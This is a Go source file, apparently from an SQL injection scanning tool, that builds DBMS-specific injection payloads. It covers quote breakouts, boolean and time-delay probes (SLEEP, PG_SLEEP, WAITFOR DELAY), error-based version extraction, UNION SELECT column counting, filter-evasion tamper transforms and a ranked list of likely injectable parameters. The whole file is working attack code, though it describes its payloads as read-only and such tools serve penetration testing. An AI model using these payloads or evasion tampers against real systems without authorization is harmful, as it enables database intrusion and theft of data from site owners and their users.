// Package payload builds DBMS-aware SQL injection payloads and applies
// tamper transformations. Every payload in this library is read-only: it
// performs comparisons, time delays or error-based version reads. No payload
// modifies or deletes data.
package payload

import (
	"fmt"
	"net/url"
	"sort"
	"strconv"
	"strings"
)

// Technique identifies a detection method.
type Technique string

const (
	Error   Technique = "error"
	Boolean Technique = "boolean"
	Time    Technique = "time"
	Union   Technique = "union"
)

// AllTechniques lists supported techniques in detection order.
var AllTechniques = []Technique{Error, Boolean, Time, Union}

// ParseTechnique validates a technique name.
func ParseTechnique(s string) (Technique, error) {
	s = strings.ToLower(strings.TrimSpace(s))
	for _, t := range AllTechniques {
		if string(t) == s {
			return t, nil
		}
	}
	return "", fmt.Errorf("unknown technique %q (use error, boolean, time, union)", s)
}

// BoolPair is a true/false payload pair used for boolean inference.
type BoolPair struct {
	Name  string
	True  string
	False string
}

// TimePayload is a delay-based payload.
type TimePayload struct {
	Name  string
	Value string
	DBMS  string
}

// ErrorPayload is a payload expected to trigger a database error.
type ErrorPayload struct {
	Name    string
	Value   string
	DBMS    string
	Extract bool
}

// Breakouts returns quote/paren sequences used to escape the surrounding SQL
// context, ordered from least to most intrusive.
func Breakouts(level int) []string {
	out := []string{"", "'"}
	if level >= 2 {
		out = append(out, "\"", "')", "\"))")
	}
	if level >= 3 {
		out = append(out, "`)", "'))", "\")))", "') OR ('1'='1")
	}
	return out
}

// Comments returns SQL comment terminators appropriate for the level.
func Comments(level int) []string {
	out := []string{"-- -"}
	if level >= 2 {
		out = append(out, "#", "/*")
	}
	if level >= 3 {
		out = append(out, "--", ";-- -")
	}
	return out
}

// BooleanPairs generates true/false payload pairs for the given level/risk.
func BooleanPairs(level, risk int) []BoolPair {
	if level < 1 {
		level = 1
	}
	if risk < 1 {
		risk = 1
	}
	var pairs []BoolPair
	for _, prefix := range Breakouts(level) {
		for _, comment := range Comments(level) {
			pairs = append(pairs, BoolPair{
				Name:  fmt.Sprintf("numeric[%s]", label(prefix)),
				True:  prefix + " AND 1=1 " + comment,
				False: prefix + " AND 1=2 " + comment,
			})
			switch {
			case strings.HasSuffix(prefix, "'"):
				pairs = append(pairs, BoolPair{
					Name:  fmt.Sprintf("string[%s]", label(prefix)),
					True:  prefix + " AND '1'='1' " + comment,
					False: prefix + " AND '1'='2' " + comment,
				})
			case strings.HasSuffix(prefix, "\""):
				pairs = append(pairs, BoolPair{
					Name:  fmt.Sprintf("string[%s]", label(prefix)),
					True:  prefix + " AND \"1\"=\"1\" " + comment,
					False: prefix + " AND \"1\"=\"2\" " + comment,
				})
			}
			if risk >= 2 {
				pairs = append(pairs, BoolPair{
					Name:  fmt.Sprintf("or[%s]", label(prefix)),
					True:  prefix + " OR 1=1 " + comment,
					False: prefix + " OR 1=2 " + comment,
				})
			}
		}
	}
	return dedupePairs(pairs)
}

func dedupePairs(in []BoolPair) []BoolPair {
	seen := map[string]bool{}
	out := in[:0]
	for _, p := range in {
		k := p.True + "|" + p.False
		if seen[k] {
			continue
		}
		seen[k] = true
		out = append(out, p)
	}
	return out
}

func label(prefix string) string {
	if prefix == "" {
		return "plain"
	}
	return strings.NewReplacer("'", "q", "\"", "dq", ")", "p", "(", "P", " ", "_").Replace(prefix)
}

// TimePayloads returns delay payloads for the given DBMS. When dbms is empty,
// a short cross-DBMS set is returned so the engine can identify the backend.
func TimePayloads(dbms string, delay, level int) []TimePayload {
	if delay < 1 {
		delay = 5
	}
	d := strconv.Itoa(delay)
	prefixes := []string{"'"}
	if level >= 2 {
		prefixes = append(prefixes, "", "\"")
	} else {
		prefixes = append(prefixes, "")
	}
	comment := "-- -"

	type tpl struct{ name, value, dbms string }
	var templates []tpl
	add := func(name, value, db string) {
		templates = append(templates, tpl{name, value, db})
	}

	want := func(db string) bool {
		return dbms == "" || strings.EqualFold(dbms, db) || (dbms == "generic" && db == "generic")
	}

	if want("mysql") {
		add("mysql-sleep", " AND SLEEP({D})", "mysql")
		add("mysql-if", " AND 1=IF(1=1,SLEEP({D}),0)", "mysql")
	}
	if want("postgres") || want("postgresql") {
		add("postgres-sleep", " AND 1=(SELECT 1 FROM PG_SLEEP({D}))", "postgres")
		add("postgres-pipe", "||PG_SLEEP({D})||", "postgres")
	}
	if want("mssql") || want("sqlserver") {
		add("mssql-waitfor", "; WAITFOR DELAY '0:0:{D}'", "mssql")
		add("mssql-if", " IF(1=1) WAITFOR DELAY '0:0:{D}'", "mssql")
	}
	if want("oracle") && level >= 2 {
		add("oracle-pipe", " AND 1=dbms_pipe.receive_message(('a'),{D})", "oracle")
	}
	if want("sqlite") && level >= 2 {
		add("sqlite-heavy", " AND 1=randomblob(100000000)", "sqlite")
	}
	if want("generic") || dbms == "" {
		add("generic-sleep", " AND SLEEP({D})", "generic")
	}

	var out []TimePayload
	seen := map[string]bool{}
	for _, p := range prefixes {
		for _, t := range templates {
			value := p + strings.ReplaceAll(t.value, "{D}", d) + " " + comment
			if seen[value] {
				continue
			}
			seen[value] = true
			out = append(out, TimePayload{
				Name:  t.name + "[" + label(p) + "]",
				Value: value,
				DBMS:  t.dbms,
			})
		}
	}
	return out
}

// ErrorPayloads returns payloads that provoke database errors. Payloads with
// Extract set additionally read the version string from the error message.
func ErrorPayloads(dbms string) []ErrorPayload {
	want := func(db string) bool {
		return dbms == "" || strings.EqualFold(dbms, db)
	}
	var out []ErrorPayload
	add := func(name, value, db string, extract bool) {
		out = append(out, ErrorPayload{Name: name, Value: value, DBMS: db, Extract: extract})
	}

	// Generic syntax breakers.
	add("syntax-quote", "'", "", false)
	add("syntax-dquote", "\"", "", false)
	add("syntax-paren", "')", "", false)
	add("syntax-arithmetic", "'+", "", false)
	add("syntax-union-null", "' UNION SELECT NULL-- -", "", false)

	if want("mysql") {
		add("mysql-extractvalue", "' AND extractvalue(1,concat(0x7e,version()))-- -", "mysql", true)
		add("mysql-updatexml", "' AND updatexml(1,concat(0x7e,version()),1)-- -", "mysql", true)
		add("mysql-floor", "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "mysql", true)
	}
	if want("postgres") {
		add("postgres-cast", "' AND 1=CAST((SELECT version()) AS int)-- -", "postgres", true)
		add("postgres-div", "' AND 1=(SELECT 1/0)-- -", "postgres", false)
	}
	if want("mssql") {
		add("mssql-convert", "' AND 1=CONVERT(int,@@version)-- -", "mssql", true)
		add("mssql-div", "' AND 1=1/0-- -", "mssql", false)
	}
	if want("oracle") {
		add("oracle-ctx", "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -", "oracle", true)
	}
	if want("sqlite") {
		add("sqlite-cast", "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -", "sqlite", true)
	}
	return out
}

// UnionSelect builds a UNION SELECT statement with the given column count.
// marker, when non-empty, is placed in the first column; otherwise NULL is
// used for every column.
func UnionSelect(prefix string, columns int, marker string, dbms string) string {
	if columns < 1 {
		return ""
	}
	cols := make([]string, columns)
	first := "NULL"
	if marker != "" {
		first = "'" + strings.ReplaceAll(marker, "'", "''") + "'"
	}
	cols[0] = first
	for i := 1; i < columns; i++ {
		cols[i] = "NULL"
	}
	return prefix + " UNION SELECT " + strings.Join(cols, ",") + "-- -"
}

// UnionVersion builds a UNION SELECT that returns the DBMS version in the
// first column.
func UnionVersion(prefix string, columns int, dbms string) string {
	if columns < 1 {
		return ""
	}
	expr := "version()"
	switch strings.ToLower(dbms) {
	case "mssql":
		expr = "@@version"
	case "sqlite":
		expr = "sqlite_version()"
	case "oracle":
		expr = "(SELECT banner FROM v$version WHERE rownum=1)"
	}
	cols := make([]string, columns)
	cols[0] = expr
	for i := 1; i < columns; i++ {
		cols[i] = "NULL"
	}
	return prefix + " UNION SELECT " + strings.Join(cols, ",") + "-- -"
}

// OrderBy builds an ORDER BY payload for column counting.
func OrderBy(prefix string, n int) string {
	return fmt.Sprintf("%s ORDER BY %d-- -", prefix, n)
}

// ZeroDelay rewrites a time payload to use a zero second delay, producing a
// control request that should return at baseline speed. It returns "" when the
// payload has no time component.
func ZeroDelay(value string, delay int) string {
	if delay <= 0 {
		return ""
	}
	d := strconv.Itoa(delay)
	out := value
	replacements := [][2]string{
		{"SLEEP(" + d + ")", "SLEEP(0)"},
		{"PG_SLEEP(" + d + ")", "PG_SLEEP(0)"},
		{"0:0:" + d, "0:0:0"},
		{"('a')," + d + ")", "('a'),0)"},
	}
	for _, r := range replacements {
		out = strings.ReplaceAll(out, r[0], r[1])
	}
	if out == value {
		return ""
	}
	return out
}

// TamperFunc transforms a payload before it is sent.
type TamperFunc func(string) string

var tamperRegistry = map[string]TamperFunc{
	"randomcase": func(s string) string {
		var b strings.Builder
		for i, r := range s {
			if i%2 == 0 {
				b.WriteString(strings.ToUpper(string(r)))
			} else {
				b.WriteString(strings.ToLower(string(r)))
			}
		}
		return b.String()
	},
	"space2comment": func(s string) string {
		return strings.ReplaceAll(s, " ", "/**/")
	},
	"space2plus": func(s string) string {
		return strings.ReplaceAll(s, " ", "+")
	},
	"space2randomblank": func(s string) string {
		alts := []string{"%09", "%0A", "%0C", "%0D", "/**/"}
		var b strings.Builder
		n := 0
		for _, r := range s {
			if r == ' ' {
				b.WriteString(alts[n%len(alts)])
				n++
			} else {
				b.WriteRune(r)
			}
		}
		return b.String()
	},
	"charencode": func(s string) string {
		var b strings.Builder
		for i := 0; i < len(s); i++ {
			c := s[i]
			if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
				b.WriteByte(c)
			} else {
				fmt.Fprintf(&b, "%%%02X", c)
			}
		}
		return b.String()
	},
	"urlencode": func(s string) string { return url.QueryEscape(s) },
	"doubleurlencode": func(s string) string {
		return strings.ReplaceAll(url.QueryEscape(s), "%", "%25")
	},
	"apostrophe": func(s string) string {
		return strings.ReplaceAll(s, "'", "%27")
	},
	"equaltolike": func(s string) string {
		return strings.ReplaceAll(s, "=", " LIKE ")
	},
	"between": func(s string) string {
		return strings.ReplaceAll(s, ">", " NOT BETWEEN 0 AND ")
	},
	"comment": func(s string) string {
		return strings.ReplaceAll(s, " ", "/**/")
	},
	"versionedmorekeywords": func(s string) string {
		replacer := strings.NewReplacer(
			"UNION", "/*!50000UNION*/",
			"SELECT", "/*!50000SELECT*/",
			"SLEEP", "/*!50000SLEEP*/",
			"AND", "/*!50000AND*/",
		)
		return replacer.Replace(s)
	},
}

// Apply runs the named tampers in order over value.
func Apply(value string, names []string) (string, error) {
	for _, name := range names {
		name = strings.ToLower(strings.TrimSpace(name))
		if name == "" {
			continue
		}
		fn, ok := tamperRegistry[name]
		if !ok {
			return "", fmt.Errorf("unknown tamper %q (available: %s)", name, strings.Join(TamperNames(), ", "))
		}
		value = fn(value)
	}
	return value, nil
}

// TamperNames returns the sorted list of available tampers.
func TamperNames() []string {
	names := make([]string, 0, len(tamperRegistry))
	for k := range tamperRegistry {
		names = append(names, k)
	}
	sort.Strings(names)
	return names
}

// ValidateTamper reports whether name is a known tamper.
func ValidateTamper(name string) bool {
	_, ok := tamperRegistry[strings.ToLower(name)]
	return ok
}

// TamperDoc describes a tamper script.
type TamperDoc struct {
	Name        string
	Description string
}

var tamperDescriptions = map[string]string{
	"randomcase":            "alternate upper/lower case to defeat case-sensitive keyword filters",
	"space2comment":         "replace spaces with /**/ comments",
	"space2plus":            "replace spaces with + (useful in URL-encoded contexts)",
	"space2randomblank":     "replace spaces with random whitespace characters",
	"charencode":            "percent-encode every non-alphanumeric character",
	"urlencode":             "URL-encode the payload",
	"doubleurlencode":       "double URL-encode the payload",
	"apostrophe":            "percent-encode single quotes only",
	"equaltolike":           "replace = with LIKE",
	"between":               "replace > with NOT BETWEEN 0 AND",
	"comment":               "alias of space2comment",
	"versionedmorekeywords": "wrap MySQL keywords in /*!50000...*/ comments",
}

// TamperDocs returns documentation for every tamper, sorted by name.
func TamperDocs() []TamperDoc {
	names := TamperNames()
	docs := make([]TamperDoc, 0, len(names))
	for _, n := range names {
		desc := tamperDescriptions[n]
		if desc == "" {
			desc = "custom transformation"
		}
		docs = append(docs, TamperDoc{Name: n, Description: desc})
	}
	return docs
}

// CommonParams is a list of parameter names that are commonly injectable.
// Used to prioritize scanning when many parameters are present.
var CommonParams = map[string]int{
	"id": 10, "pid": 10, "uid": 10, "gid": 10, "cid": 9, "nid": 9,
	"page": 8, "p": 8, "cat": 8, "category": 8, "product": 8, "item": 8,
	"user": 7, "username": 7, "name": 6, "q": 6, "query": 7, "search": 7,
	"s": 6, "keyword": 6, "keywords": 6, "order": 5, "sort": 5, "filter": 5,
	"where": 6, "select": 6, "report": 5, "view": 5, "file": 5, "path": 5,
	"url": 4, "redirect": 4, "lang": 4, "locale": 4, "type": 4, "action": 4,
	"year": 4, "month": 4, "date": 4, "start": 4, "end": 4, "from": 4, "to": 4,
	"email": 3, "password": 3, "token": 2, "code": 3, "key": 3, "api_key": 2,
}

// Priority scores a parameter name for scan ordering. Higher is better.
func Priority(name string) int {
	l := strings.ToLower(name)
	if score, ok := CommonParams[l]; ok {
		return score
	}
	for param, score := range CommonParams {
		if strings.Contains(l, param) {
			return score - 3
		}
	}
	return 0
}
